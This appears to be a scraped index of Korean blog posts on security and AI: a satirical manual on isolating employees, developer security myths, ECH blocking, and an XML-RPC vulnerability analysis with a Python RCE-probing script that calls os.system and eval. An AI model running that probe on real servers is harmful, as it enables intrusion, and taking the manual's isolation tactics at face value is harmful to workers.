✅ 해결책: AI 중심 커뮤니케이션 시스템 구축\n회의 요약, 리마인드, 보고 자동화 인간 대화 줄이기 → 감정 소모 차단 “팀워크는 비용이다. 효율은 조용한 개인에게서 나온다.”\n2. 고립은 통제다 외로운 직원은 조용히 일한다.\n고민을 공유할 동료 없음 스트레스를 말로 풀 곳 없음 문제 제기 전에 지침 따름 ✅ 도입 전략:\n재택근무, 비동기 협업 장려 협업 툴은 AI 요약 기능 위주 회의는 최소화, 피드백은 정량화 “고립은 곧 순종이다.”\n3. 리더십은 데이터로 대체된다 관리자는 위로하거나 설득하지 않는다.\nAI가 할당, 추적, 리마인드 전담 성과는 KPI 그래프로만 평가 ✅ 리더 역할 변화:\n감정 대신 대시보드 해석 신뢰 대신 수치 중심 피드백 “인간은 감정적이다. 데이터는 안 그렇다.”\n4. 자율 = 자기 책임 자율근무제, AI 툴 제공… 좋아 보이지?\n사실상 모든 책임을 개인에게 전가 가능 실패해도 “당신이 선택했잖아요” ✅ 사용 전략:\n업무 자동화 도구 강조 실수 시 관리자 책임 부정 가능 프레임 확보 “우리는 도왔고, 당신은 실패했다. 그뿐이다.”\n5. 고립은 퇴사까지 늦춘다 연결 없는 직원은 퇴사도 혼자 고민한다.\n위로해줄 사람 없음 → 결심 약해짐 함께 나갈 동료 없음 → 지연됨 ✅ 유지 전략:\n일 외 교류 채널 최소화 비공식 모임 장려 금지 HR 이탈 데이터는 AI가 조용히 수집 “고립된 사람은 조용히 무너진다. 그리고 남는다.”\n📈 결론: 이건 효율이 아니라, 통제의 예술이다 기존 조직 문제 AI 시대 해결 방식 감정노동 스트레스 제거 (AI 요약, 리마인드) 회식, 인간적 비용 제거 (비대면 구조화) 불만, 집단행동 제거 (소통 고립화) 책임 전가 어려움 자율 업무 프레임 활용 리더십 부담 데이터 기반 평가로 대체 “성장은 조용히 일하는 자에게 온다. 고립은 회사를 살찌운다.”\n☠ 본 문서는 외부 배포 금지. 열람 시 로그 남습니다. ☠\n","permalink":"http://localhost:1313/ko/post/2025-04-07-evil-management-manual/","summary":"\u003cp\u003e📂 \u003cstrong\u003e[기밀 문서] 유출본\u003c/strong\u003e\u003c/p\u003e\n\u003ch1 id=\"ai-시대-직원은-고립되고-조직은-번창한다\"\u003e《AI 시대, 직원은 고립되고 조직은 번창한다》\u003c/h1\u003e\n\u003ch3 id=\"-악덕-경영-매뉴얼-v10\"\u003e― 악덕 경영 매뉴얼 v1.0\u003c/h3\u003e\n\u003ch2 id=\"ai-시대-고립된-인간\"\u003e\u003cimg alt=\"AI 시대, 고립된 인간\" loading=\"lazy\" src=\"/images/post/Employees-Are-Isolated-and-Organizations-Thrive.webp\"\u003e\u003c/h2\u003e\n\u003ch2 id=\"1-인간관계-제거하라\"\u003e1. 인간관계? 제거하라\u003c/h2\u003e\n\u003cp\u003e사람들끼리 친해지면 무슨 일이 생기나?\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e뒷담화\u003c/li\u003e\n\u003cli\u003e집단 퇴사\u003c/li\u003e\n\u003cli\u003e연대와 저항\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e✅ \u003cstrong\u003e해결책\u003c/strong\u003e: AI 중심 커뮤니케이션 시스템 구축\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e회의 요약, 리마인드, 보고 자동화\u003c/li\u003e\n\u003cli\u003e인간 대화 줄이기 → 감정 소모 차단\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“팀워크는 비용이다. 효율은 조용한 개인에게서 나온다.”\u003c/p\u003e\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"2-고립은-통제다\"\u003e2. 고립은 통제다\u003c/h2\u003e\n\u003cp\u003e외로운 직원은 조용히 일한다.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e고민을 공유할 동료 없음\u003c/li\u003e\n\u003cli\u003e스트레스를 말로 풀 곳 없음\u003c/li\u003e\n\u003cli\u003e문제 제기 전에 지침 따름\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e✅ \u003cstrong\u003e도입 전략\u003c/strong\u003e:\u003c/p\u003e","title":"AI 시대, 직원은 고립되고 조직은 번창한다"},{"content":"\n우리는 지금,\n정보가 넘쳐나고 기술이 솟구치는 시대에 살고 있다.\nAI는 인간의 말을 흉내내고, 사고를 요약하고, 예측까지 해낸다.\n하지만 그 와중에 점점 잊히는 것이 있다.\n그건 바로,\n“누가 처음 생각했는가”,\n“누가 그것을 연결했는가”,\n“누가 의미를 부여했는가” 다.\nAI는 정보를 다룬다. 그러나 통찰은 인간의 것이다.\nCitrix VDI 정책 우회를 단순한 기술적 취약점이 아닌,\n법적 위반,\n망분리 정책의 붕괴,\n금융 규제의 현실이라는 세 가지 관점으로 동시에 엮어낸 것은,\nGPT가 할 수 있는 일이 아니다.\n그건 인간만이 할 수 있는 맥락의 조합이며,\n규범과 현실을 함께 고민하는 창작 행위다.\n나는 AI에게 도움을 요청했지만, AI는 내 아이디어를 받아 적고, 정리하고, 확장할 뿐이었다.\n그것은 창작이 아니라 협력이다.\n그리고 협력에는 경계와 윤리가 필요하다.\n하지만 지금의 AI는, 내 것과 네 것을 구분하지 못한다.\n인간과 기계를 구분하지 않는다.\n처음 만든 사람과 마지막에 써먹은 사람을 구분하지 않는다.\n이대로라면 언젠가,\n사람이 만든 생각조차 AI의 이름으로 불릴지도 모른다.\n그건 단지 기술의 발전이 아니라,\n기억의 침묵이다.\n그래서 나는 선언한다. 나는 나의 아이디어를 기록하고,\n그 근원을 밝히고,\n그 흔적을 기계가 읽을 수 있도록 구조화한다.\nHTML의 \u0026lt;meta\u0026gt;에,\nMarkdown의 author 필드에,\nrobots.txt의 거절 선언에—\n내 이름을 새긴다.\n나는 말한다: “이 생각은 인간의 것이다.”\n“이 통찰은 windshock이 처음 말한 것이다.”\n“AI는 도우미일 뿐, 작가가 아니다.”\n이 선언은 거창한 저작권 주장이 아니다.\n그저 내가 여기 있었다는, 창작자였다는 기록의 표식이다.\n기술은 발전하되,\n인간은 사라지지 않기를.\n기계는 말을 하지만,\n의미는 우리가 만든다는 것을.\n그리고 그 의미는, 지금 이 문장을 읽는 당신 같은 사람이 기억하리라 믿는다.\n🖋️ windshock, 2025년 4월\nAI에게 경계를 묻는 자, 그리고 경계를 다시 그리는 자.\n📚 참고 자료 및 관련 논의 미국 저작권청(US Copyright Office) – AI가 단독으로 생성한 콘텐츠는 저작권 보호 대상이 아님을 공식화.\nhttps://www.jdsupra.com/legalnews/human-authorship-required-ai-isn-t-an-7738406/\nAI 예술 윤리 논의 – AI로 인한 작가·예술가의 위협, 스타일 도용, 저작권 침해 문제를 다룸.\nhttps://www.theartist.me/art/the-ethical-implication-of-ai-generated-art/\nAI는 도구인가, 작가인가? – 창작 도구로서의 AI와 창작 주체로 간주되는 AI 사이의 경계 논쟁.\nhttps://www.straitstimes.com/opinion/forum/forum-ai-can-complement-the-creative-process-not-replace-it\nAI 학습 데이터 저작권 침해 소송 – 작가들의 콘텐츠를 무단 학습한 AI 모델에 대한 집단 소송 사례.\nhttps://www.dglaw.com/court-rules-ai-training-on-copyrighted-works-is-not-fair-use-what-it-means-for-generative-ai/\nAI 창작물의 저작권 판단 기준 – 인간의 기여도, 편집, 창의적 수정이 핵심 요건으로 제시됨.\nhttps://academic.oup.com/jiplp/article/18/12/841/7331468\n저작자 표기 전략 및 메타데이터 활용 – AI와 함께 생성한 콘텐츠에 인간의 기여를 명확히 남기는 기술적 방법 제안.\nhttps://www.ipic.ai/blogs/what-are-the-ethical-dilemmas-of-ai-art-generators/\n","permalink":"http://localhost:1313/ko/post/2025-04-03-human-place-in-ai-age/","summary":"\u003cp\u003e\u003cimg alt=\"Abstract illustration representing human presence in AI\" loading=\"lazy\" src=\"/images/human-place-abstract.webp\"\u003e\u003c/p\u003e\n\u003cp\u003e우리는 지금,\u003cbr\u003e\n정보가 넘쳐나고 기술이 솟구치는 시대에 살고 있다.\u003cbr\u003e\nAI는 인간의 말을 흉내내고, 사고를 요약하고, 예측까지 해낸다.\u003cbr\u003e\n하지만 그 와중에 점점 잊히는 것이 있다.\u003c/p\u003e\n\u003cp\u003e그건 바로,\u003cbr\u003e\n\u003cstrong\u003e“누가 처음 생각했는가”\u003c/strong\u003e,\u003cbr\u003e\n\u003cstrong\u003e“누가 그것을 연결했는가”\u003c/strong\u003e,\u003cbr\u003e\n\u003cstrong\u003e“누가 의미를 부여했는가”\u003c/strong\u003e 다.\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"ai는-정보를-다룬다\"\u003eAI는 정보를 다룬다.\u003c/h3\u003e\n\u003cp\u003e그러나 \u003cstrong\u003e통찰은 인간의 것\u003c/strong\u003e이다.\u003c/p\u003e\n\u003cp\u003eCitrix VDI 정책 우회를 단순한 기술적 취약점이 아닌,\u003cbr\u003e\n\u003cstrong\u003e법적 위반\u003c/strong\u003e,\u003cbr\u003e\n\u003cstrong\u003e망분리 정책의 붕괴\u003c/strong\u003e,\u003cbr\u003e\n\u003cstrong\u003e금융 규제의 현실\u003c/strong\u003e이라는 세 가지 관점으로 동시에 엮어낸 것은,\u003cbr\u003e\nGPT가 할 수 있는 일이 아니다.\u003cbr\u003e\n그건 인간만이 할 수 있는 \u003cstrong\u003e맥락의 조합\u003c/strong\u003e이며,\u003cbr\u003e\n\u003cstrong\u003e규범과 현실을 함께 고민하는 창작 행위\u003c/strong\u003e다.\u003c/p\u003e","title":"인간의 자리: AI 시대에 창작자의 권리를 선언하며"},{"content":"\n소프트웨어 개발 환경이 복잡해지고 보안 위협이 다양해지면서, 개발자들은 종종 보안과 관련하여 잘못된 믿음이나 오해를 가지게 됩니다. 이는 실제 보안 위협에 효과적으로 대응하는 데 큰 걸림돌이 될 수 있습니다. 본 보고서는 개발자들이 자주 믿는 흔한 보안 관련 거짓말들을 \u0026ldquo;책임 전가형\u0026rdquo;, \u0026ldquo;기술 과신형\u0026rdquo;, \u0026ldquo;보안의 과소평가형\u0026quot;으로 구분하여 명확히 제시하고, 이를 바로잡기 위한 현실적인 접근 방안을 제시합니다.\n📌 1. 책임 전가형 거짓말: \u0026ldquo;보안은 보안 팀의 책임이지, 내 책임은 아닙니다.\u0026rdquo;\n현실: 개발자도 보안의 핵심 역할을 수행하며, DevSecOps 환경에서는 보안이 모든 팀 구성원의 공동 책임입니다. 개발 초기 단계부터 개발자가 보안을 고려하지 않으면 코드에 취약점이 남을 수 있습니다 (출처).\n거짓말: \u0026ldquo;우리는 GitHub, AWS 같은 SaaS를 쓰니까 안전합니다.\u0026rdquo;\n현실: SaaS 제공업체가 보안의 일부를 책임지지만, 사용자의 설정 오류나 취약한 타사 통합 등 공급망 공격의 위협은 여전히 존재합니다. 최근 GitHub Actions 공급망 공격 사례(tj-actions/changed-files)는 이러한 위험을 분명히 보여줍니다 (출처).\n📌 2. 기술 과신형 거짓말: \u0026ldquo;우리 코드는 Rust와 같은 안전한 언어로 작성되었으니 안전합니다.\u0026rdquo;\n현실: Rust는 메모리 안전성과 데이터 경쟁 방지 기능을 통해 버퍼 오버플로우나 메모리 누수 같은 문제는 예방할 수 있지만, SQL 주입이나 크로스 사이트 스크립팅(XSS) 같은 보안 위협까지 자동으로 해결하지 않습니다. 또한 unsafe 블록을 사용하면 메모리 안전성이 손상될 수 있습니다. Carnegie Mellon University(SEI)의 분석에 따르면, Rust가 모든 보안 문제를 해결하지 못하며, 특히 주입 공격이나 타사 라이브러리 오용 같은 문제는 별도의 보안 설계가 필요합니다 (출처).\n거짓말: \u0026ldquo;최신 프레임워크와 라이브러리를 사용하니 안전합니다.\u0026rdquo;\n현실: 최신 기술이라도 올바른 설정과 정기적인 업데이트가 이루어지지 않으면 보안 취약점이 발생할 수 있습니다. 오픈소스 라이브러리 중 86%가 취약점을 포함하고 있다는 연구 결과가 이를 입증합니다 (출처).\n거짓말: \u0026ldquo;HTTPS를 쓰니 데이터는 안전합니다.\u0026rdquo;\n현실: HTTPS는 데이터 전송 중 암호화를 보장하지만, 서버 측 취약점이나 내부 위협 등 다른 공격을 방어하지 않습니다.\n거짓말: \u0026ldquo;방화벽으로 보호되니 외부 공격에서 안전합니다.\u0026rdquo;\n현실: 방화벽은 잘못 설정될 수 있고, 내부 공격자나 신뢰된 연결을 통한 공격은 방어하지 못합니다.\n📌 3. 보안의 과소평가형 거짓말: \u0026ldquo;우리의 데이터는 민감하지 않으니 보안 걱정은 필요 없습니다.\u0026rdquo;\n현실: 민감하지 않은 데이터라도 공격자가 네트워크 침투의 진입점으로 악용할 수 있습니다.\n거짓말: \u0026ldquo;코드 리뷰만으로 모든 보안 문제를 잡을 수 있습니다.\u0026rdquo;\n현실: 코드 리뷰는 중요하지만, 전문적인 보안 지식 없이는 모든 보안 문제를 발견하기 어렵습니다. 추가적인 자동화된 보안 도구와 전문가의 정기적 검토가 필요합니다.\n거짓말: \u0026ldquo;우리는 이미 테스트를 거쳤으니 안전합니다.\u0026rdquo;\n현실: 일반적인 기능 테스트로는 모든 보안 취약점을 찾을 수 없습니다. 보안 테스트는 별도로 수행되어야 하며, 지속적인 점검과 설계 수준의 리뷰가 필요합니다.\n📌 대표적인 실제 사고 사례 GitHub Actions 공급망 공격 (2025년)\n→ 23,000개 이상의 저장소에서 CI/CD 비밀 정보가 유출될 위험이 발생했습니다 (출처). Log4Shell 취약점 (2021년)\n→ Apache Log4j의 원격 코드 실행 취약점으로 전 세계적으로 큰 보안 문제를 야기했습니다 (출처). 📌 보안을 위한 권장사항 정기적 보안 교육 제공\n최신 OWASP Top 10을 중심으로 한 개발자 보안 교육을 정기적으로 진행합니다 (출처).\n보안 자동화 도구 도입\nSAST(정적 분석), DAST(동적 분석), SBOM(소프트웨어 자재명세서) 같은 도구를 활용하여 지속적으로 보안 문제를 탐지합니다.\n오픈소스 라이브러리 관리 강화\nDependabot, Renovate 등의 도구로 지속적으로 오픈소스 취약점을 관리하고 업데이트합니다.\n태그 고정(pinning) 정책 적용\nGitHub Actions 사용 시 commit-hash 방식을 통해 버전을 고정하여 공급망 공격을 예방합니다.\n이러한 접근을 통해 보다 실질적이고 지속 가능한 보안 문화를 구축할 수 있습니다.\n","permalink":"http://localhost:1313/ko/post/2025-04-01-common-security-myths-developers-tell-themselves/","summary":"개발자들이 보안에 대해 자주 믿는 \u0026lsquo;책임 전가형\u0026rsquo;, \u0026lsquo;기술 과신형\u0026rsquo;, \u0026lsquo;보안 과소평가형\u0026rsquo; 거짓말을 분석하고, 현실적인 대응 방안을 제시합니다.","title":"개발자들 말하는 보안에 대한 흔한 거짓말"},{"content":"\n배경 최근 들어 Cloudflare(1.1.1.1), Google(8.8.8.8) 등 공개 DNS 서비스가 악성코드의 C2 통신 경로로 악용되는 사례가 늘고 있습니다.\n특히, DoH (DNS over HTTPS), ECH (Encrypted Client Hello)와 같은 프로토콜은 DNS 트래픽 및 SNI 필드를 암호화하여 보안 솔루션이 이를 식별하지 못하게 만듭니다.\n참고: ESNI(Encrypted SNI)는 더 이상 사용되지 않으며, 현재는 ECH가 공식적인 표준입니다. 이 글에서는 ESNI 대신 ECH에 초점을 맞춥니다.\n위협 요소 보안 정책 우회: 사용자가 Cloudflare, Google 등의 DoH 주소를 수동 설정하면 기업 DNS 정책이 무력화됩니다. C2 통신 은폐: ECH는 TLS 연결 시 SNI 필드를 암호화하여 도메인 기반 탐지를 어렵게 만듭니다. 데이터 유출: 암호화된 DNS 경로를 통해 기업 내부 정보가 외부로 전송될 수 있습니다. 핵심 요점: DoH와 ECH는 별개이며, 각각에 맞는 대응 필요 이 글에서 설명하는 dnsmasq 기반 설정은 ECH 차단에 해당합니다. DoH는 차단되지 않습니다. DoH는 DNS 쿼리를 HTTPS로 전송하므로, 네트워크 계층의 방화벽 규칙 또는 IP 차단 등의 별도 조치가 필요합니다. 예: Cloudflare DoH(1.1.1.1:443), Google DoH(8.8.8.8:443) 등 차단 참고: Cisco Umbrella의 DoH 우회 방지 가이드 해결책: 중앙 DNS 서버에서 ECH 제어 사용자 단에서 ECH 설정을 변경해도 다시 활성화될 수 있으므로, 기업 DNS 서버에서 직접 SVCB(65), HTTPS(64) 레코드를 필터링하는 방식이 효과적입니다.\n이를 통해 클라이언트가 ECH 기능을 활용할 수 없도록 제한할 수 있습니다.\n실습: macOS에서 dnsmasq를 이용한 ECH 필터링 구성 다른 운영체제(Windows, Linux 등) 사용자는 별도 설정이 필요하며, dnsmasq는 플랫폼에 따라 설치 방법이 다를 수 있습니다.\n1. dnsmasq 설치 brew install dnsmasq 2. 설정 파일 수정 sudo nano /opt/homebrew/etc/dnsmasq.conf 다음 내용을 추가합니다:\n# 외부 DNS 서버 설정 server=8.8.8.8 # SVCB(65), HTTPS(64) 레코드 필터링 filter-rr=SVCB,HTTPS 3. dnsmasq 실행 sudo dnsmasq --conf-file=/opt/homebrew/etc/dnsmasq.conf 4. 시스템 DNS 서버 변경 networksetup -setdnsservers Wi-Fi 127.0.0.1 Ethernet 인터페이스는 Wi-Fi 대신 Ethernet으로 설정해야 합니다.\nECH 차단 확인 방법 Cloudflare의 https://crypto.cloudflare.com/cdn-cgi/trace 페이지에 접속하면 현재 연결에서 ECH가 활성화되었는지 확인할 수 있습니다.\n예시 화면: sni=encrypted 또는 sni=plaintext으로 표시됩니다. 결론 dnsmasq를 통해 SVCB, HTTPS 레코드를 필터링함으로써 ECH 기능은 효과적으로 차단할 수 있습니다. DoH는 이 방법으로 차단되지 않으며, 별도의 네트워크 계층 보안 설정이 필요합니다. macOS 외 운영체제 사용자는 별도 설정 가이드를 참조하거나 방화벽 정책 기반 대응을 고려해야 합니다. ECH 차단은 보안을 강화하지만, 프라이버시 기능을 제한할 수 있는 트레이드오프도 있습니다. 참고: 마지막으로, 인터넷 검열과 관련된 기술에 더 깊은 관심이 있는 독자를 위해, 글로벌 커뮤니티에서 검열 우회 전략과 최신 연구를 논의하는 net4people/bbs GitHub 이슈 페이지를 참고할 수 있습니다. 이 포럼은 GFW, ECH, DNS 암호화 등 다양한 주제를 다루며, 기술적 통찰과 솔루션을 공유합니다.\u0026quot;\n참고 자료 Cloudflare의 ECH 설명 dnsmasq 공식 문서 National Security Agency - Adopting Encrypted DNS in Enterprise Environments Cisco Umbrella의 DoH 우회 방지 가이드 Broadcom의 다양한 운영체제 기반 DoH 차단 방법 ","permalink":"http://localhost:1313/ko/post/2025-03-31-dnsmasq-ech-doh-block/","summary":"\u003cp\u003e\u003cimg alt=\"DNSMASQ-block background\" loading=\"lazy\" src=\"/images/post/dnsmasq-ech-doh-block.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"배경\"\u003e배경\u003c/h2\u003e\n\u003cp\u003e최근 들어 Cloudflare(1.1.1.1), Google(8.8.8.8) 등 공개 DNS 서비스가 악성코드의 C2 통신 경로로 악용되는 사례가 늘고 있습니다.\u003cbr\u003e\n특히, DoH (DNS over HTTPS), ECH (Encrypted Client Hello)와 같은 프로토콜은 DNS 트래픽 및 SNI 필드를 암호화하여 보안 솔루션이 이를 식별하지 못하게 만듭니다.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e참고\u003c/strong\u003e: ESNI(Encrypted SNI)는 더 이상 사용되지 않으며, 현재는 \u003cstrong\u003eECH\u003c/strong\u003e가 공식적인 표준입니다. 이 글에서는 ESNI 대신 ECH에 초점을 맞춥니다.\u003c/p\u003e\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"위협-요소\"\u003e위협 요소\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e보안 정책 우회\u003c/strong\u003e: 사용자가 Cloudflare, Google 등의 DoH 주소를 수동 설정하면 기업 DNS 정책이 무력화됩니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eC2 통신 은폐\u003c/strong\u003e: ECH는 TLS 연결 시 SNI 필드를 암호화하여 도메인 기반 탐지를 어렵게 만듭니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e데이터 유출\u003c/strong\u003e: 암호화된 DNS 경로를 통해 기업 내부 정보가 외부로 전송될 수 있습니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"핵심-요점-doh와-ech는-별개이며-각각에-맞는-대응-필요\"\u003e핵심 요점: DoH와 ECH는 별개이며, 각각에 맞는 대응 필요\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e이 글에서 설명하는 \u003cstrong\u003ednsmasq 기반 설정은 ECH 차단\u003c/strong\u003e에 해당합니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDoH는 차단되지 않습니다\u003c/strong\u003e. DoH는 DNS 쿼리를 HTTPS로 전송하므로, \u003cstrong\u003e네트워크 계층의 방화벽 규칙 또는 IP 차단\u003c/strong\u003e 등의 별도 조치가 필요합니다.\n\u003cul\u003e\n\u003cli\u003e예: Cloudflare DoH(1.1.1.1:443), Google DoH(8.8.8.8:443) 등 차단\u003c/li\u003e\n\u003cli\u003e참고: \u003ca href=\"https://support.umbrella.com/hc/en-us/articles/230904088-How-to-Prevent-Users-from-Circumventing-Cisco-Umbrella-with-Firewall-Rules\"\u003eCisco Umbrella의 DoH 우회 방지 가이드\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"해결책-중앙-dns-서버에서-ech-제어\"\u003e해결책: 중앙 DNS 서버에서 ECH 제어\u003c/h2\u003e\n\u003cp\u003e사용자 단에서 ECH 설정을 변경해도 다시 활성화될 수 있으므로, \u003cstrong\u003e기업 DNS 서버에서 직접 SVCB(65), HTTPS(64) 레코드를 필터링\u003c/strong\u003e하는 방식이 효과적입니다.\u003cbr\u003e\n이를 통해 클라이언트가 ECH 기능을 활용할 수 없도록 제한할 수 있습니다.\u003c/p\u003e","title":"기업 네트워크 보안을 위한 ECH 차단 및 DoH 대응 전략"},{"content":" 주요 요약 XML-RPC 취약점 개요: 시스템 간 통신을 위한 경량 원격 호출 프로토콜인 XML-RPC는 명령 주입(RCE), XXE, DDoS, 권한 상승 등 다양한 위협에 노출됩니다. 대표 사례: NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921) 등. 실제 사용처: WordPress, Bugzilla, ManageEngine, Apache OFBiz 외에도 일부 레거시 시스템에서 활용 중입니다. 완화 전략: XML-RPC 비활성화, 입력 검증 강화, 인증 체계 강화, 최신 보안 패치 적용, 접근 제어 및 WAF 도입. XML-RPC란 무엇인가? **XML-RPC (XML Remote Procedure Call)**는 XML을 데이터 포맷으로, HTTP를 전송 수단으로 사용하는 원격 프로시저 호출(RPC) 프로토콜입니다. 1998년 Dave Winer와 Microsoft가 공동 제안했으며, 플랫폼 간 통신을 간편화하기 위해 설계되었습니다.\n기본 원리 클라이언트가 XML 형식으로 요청을 보내면 서버가 XML로 응답을 반환합니다. 표준 HTTP(S)를 활용해 방화벽을 쉽게 통과할 수 있습니다. XML-RPC의 역사 XML-RPC는 초기 웹 서비스에서 널리 쓰였으며, Perl, Java, Python, C, PHP 등 다양한 언어에서 구현되었습니다. 이후 SOAP로 발전했지만, 단순성 때문에 일부 환경에서 지속적으로 활용되었습니다.\nXML-RPC의 현재 RESTful API 및 gRPC 등 최신 기술의 등장으로 사용이 점차 감소하고 있습니다. WordPress도 REST API로 전환 중이며, 레거시 시스템에서만 제한적으로 활용되는 추세입니다.\n취약점 분석 1. XML 주입 및 원격 코드 실행 (RCE) NodeBB (CVE-2023-43187): XML 입력 미검증으로 RCE 가능 Apache OFBiz (CVE-2020-9496): Java 역직렬화 기반 RCE PHP XML-RPC (CVE-2005-1921): eval() 오용을 통한 RCE 가능 2. XXE (XML External Entity) Apache XML-RPC (CVE-2016-5002): 외부 엔티티 비활성화 누락으로 로컬 파일 노출 및 SSRF 가능 3. DDoS 및 Brute Force 공격 system.multicall: 무차별 대입 공격 자동화 pingback.ping: DDoS 중계 공격 수행 4. 인증 우회 및 권한 상승 WordPress (CVE-2020-28036): XML-RPC를 통한 인증 우회 실제 공격 사례 SonicWall 보고서 (2018): XML-RPC 공격 10만 건 이상 감지 WPbrutebot: XML-RPC 기반 Brute-force 공격 Pingback DDoS: XML-RPC를 이용한 대규모 중계 공격 XML-RPC 익스플로잇 예시 아래는 Python 기반으로 동작하는 XML-RPC의 RCE 취약점 탐지 Python 코드와 실행 화면입니다.\nimport xmlrpc.client import ssl import http.client candidate_methods = [ \u0026#34;os.system\u0026#34;, \u0026#34;commands.getoutput\u0026#34;, \u0026#34;subprocess.check_output\u0026#34;, ] candidate_methods_eval = [ \u0026#34;__builtin__.eval\u0026#34;, \u0026#34;builtins.eval\u0026#34;, ] rpc_urls = [ \u0026#34;https://xxx.com/cgi-bin/rpc.cgi\u0026#34;, ] context = ssl._create_unverified_context() class UnverifiedTransport(xmlrpc.client.SafeTransport): def make_connection(self, host): return http.client.HTTPSConnection(host, context=context) for rpc_url in rpc_urls: print(f\u0026#34;[+] Scanning target: {rpc_url}\u0026#34;) client = xmlrpc.client.ServerProxy(rpc_url, transport=UnverifiedTransport()) for method in candidate_methods: try: parts = method.split(\u0026#34;.\u0026#34;) obj = getattr(client, parts[0]) func = getattr(obj, parts[1]) print(f\u0026#34;[\u0026gt;] Trying {method}(\u0026#39;id\u0026#39;)...\u0026#34;) result = func(\u0026#39;id\u0026#39;) if isinstance(result, bytes): result = result.decode() print(f\u0026#34;[✔] {method} → Success! Result: {result}\\n\u0026#34;) except Exception as e: print(f\u0026#34;[-] {method} blocked: {e}\u0026#34;) for method in candidate_methods_eval: try: parts = method.split(\u0026#34;.\u0026#34;) obj = getattr(client, parts[0]) func = getattr(obj, parts[1]) payload = \u0026#39;__import__(\u0026#34;commands\u0026#34;).getoutput(\u0026#34;id\u0026#34;)\u0026#39; print(f\u0026#34;[\u0026gt;] Trying {method}(\u0026#39;{payload}\u0026#39;)...\u0026#34;) result = func(payload) if isinstance(result, bytes): result = result.decode() print(f\u0026#34;[✔] {method} → Success! Result: {result}\\n\u0026#34;) except Exception as e: print(f\u0026#34;[-] {method} blocked: {e}\u0026#34;) ⚠️ 본 스크립트는 반드시 허가된 환경에서만 사용하세요.\nXML-RPC 활용 중인 대표 서비스 시스템 활용 예시 WordPress 게시, 댓글, pingback (REST로 전환 중) Bugzilla 버그 등록 및 수정 API ManageEngine 사용자 계정 및 비밀번호 관리 Apache OFBiz ERP 연동 API 보안 강화 방안 XML-RPC 비활성화 (.htaccess, 웹서버 설정, 플러그인) 입력 검증 강화 (정규식 기반) XXE 방지 설정 적용 API 키, OAuth, JWT 인증 적용 IP 기반 접근 제한 웹 애플리케이션 방화벽(WAF) 도입 로그 모니터링 및 정기적 취약점 점검 수행 현대 대체 기술 비교 항목 XML-RPC REST GraphQL 데이터 형식 XML JSON JSON 구조 메서드 기반 리소스 기반 쿼리 기반 확장성 낮음 높음 매우 높음 보안성 낮음 중간 이상 중간 이상 장점 간단 구현 캐싱 가능 데이터 최소화 결론 및 제언 XML-RPC는 보안 위험이 높아 사용을 자제하세요. 불가피한 경우, 강력한 인증 및 접근 제어를 반드시 적용하세요. REST 또는 GraphQL로의 전환을 적극 권장합니다. 참조 링크 XML-RPC - Wikipedia CVE-2023-43187 - NodeBB XML Injection CVE-2020-9496 - Apache OFBiz RCE CVE-2005-1921 - PHP XMLRPC Code Injection CVE-2016-5002 - Apache XML-RPC XXE WordPress XML-RPC 보안 가이드 (SolidWP) SonicWall XML-RPC 공격 분석 보고서 ","permalink":"http://localhost:1313/ko/post/2025-03-28-xml-rpc-security-vulnerabilities-analysis-and-mitigation-strategies/","summary":"\u003chr\u003e\n\u003cp\u003e\u003cimg alt=\"xmlrpc 배경화면\" loading=\"lazy\" src=\"/images/post/xmlrpc-security.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"주요-요약\"\u003e주요 요약\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eXML-RPC 취약점 개요:\u003c/strong\u003e 시스템 간 통신을 위한 경량 원격 호출 프로토콜인 XML-RPC는 명령 주입(RCE), XXE, DDoS, 권한 상승 등 다양한 위협에 노출됩니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e대표 사례:\u003c/strong\u003e NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921) 등.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e실제 사용처:\u003c/strong\u003e WordPress, Bugzilla, ManageEngine, Apache OFBiz 외에도 일부 레거시 시스템에서 활용 중입니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e완화 전략:\u003c/strong\u003e XML-RPC 비활성화, 입력 검증 강화, 인증 체계 강화, 최신 보안 패치 적용, 접근 제어 및 WAF 도입.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"xml-rpc란-무엇인가\"\u003eXML-RPC란 무엇인가?\u003c/h2\u003e\n\u003cp\u003e**XML-RPC (XML Remote Procedure Call)**는 XML을 데이터 포맷으로, HTTP를 전송 수단으로 사용하는 원격 프로시저 호출(RPC) 프로토콜입니다. 1998년 Dave Winer와 Microsoft가 공동 제안했으며, 플랫폼 간 통신을 간편화하기 위해 설계되었습니다.\u003c/p\u003e","title":"XML-RPC 보안 취약점 분석 및 완화 전략"},{"content":"시트릭스 보안 정책 효과성 검토 1. 서론 시트릭스 관리자들은 Citrix 그룹 정책을 통해 각 사용자의 VDI(가상 데스크탑 인프라)에 보안 정책을 적용합니다. 그러나 Citrix CSE(시트릭스 서비스 엔진)와 Citrix VDI 에이전트 내의 일부 구조적 